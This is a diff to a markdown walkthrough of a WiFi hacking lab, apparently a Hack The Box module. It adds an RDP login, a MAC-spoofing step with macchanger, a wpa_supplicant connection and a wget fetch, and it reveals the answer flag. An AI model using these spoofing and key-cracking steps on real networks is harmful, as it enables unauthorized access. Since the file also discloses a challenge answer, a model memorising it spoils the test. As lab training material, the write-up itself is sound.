@@ -8,10 +8,18 @@ Harness the WiFi attack techniques you learned in this module to disclose all of
  Please wait for 2 minutes after the target spawn to connect.
 
 
+
 ---
 
 ## Steps
 
+### RDP to TARGET
+
+From your Kali Machine or from the HTP's Terminal run.
+
+```bash
+xfreerdp3 /u:wifi /p:wifi /v:<TARGET IP> /clipboard
+```
 ### What is the name of the WiFi network with the BSSID D8:D6:3D:EB:29:D5?
 
 Answer: *HTB*
@@ -92,8 +100,20 @@ aircrack-ng htb-01.cap -w /opt/wordlist.txt
 
 ### Connect to the WiFi network and submit the flag found at IP 192.168.1.1 or 192.168.2.1
 
-1. Create file called *wpa.conf*.
-2. Add the following code and save it.
+Answer: *HTB{H@ck3R_M@n}*
+
+1. Change the MAC Address to one of the associated to the network.
+
+```bash
+sudo ifconfig wlan0 down
+sudo macchanger wlan0 -m 02:00:00:00:02:00
+sudo ifconfig wlan0 up
+ifconfig wlan0
+```
+
+![[change_MAC.png]]
+2. Create file called *wpa.conf*.
+3. Add the following code and save it.
 
 ```bash
 network={
@@ -109,4 +129,26 @@ network={
 ```shell
 sudo wpa_supplicant -c wpa.conf -i wlan0
 ```
+
+4. Assign an IP from the network's DHCP server, completing the connection setup.
+
+```bash
+sudo dhclient wlan0 
+```
+
+5. Get the flag
+
+```bash
+wget -qO- http://192.168.1.1
+```
+
+![[WIFI_infiltration_map.png]]
+
+
+> [!Success]
+> Finished.
+
+
+
+
 
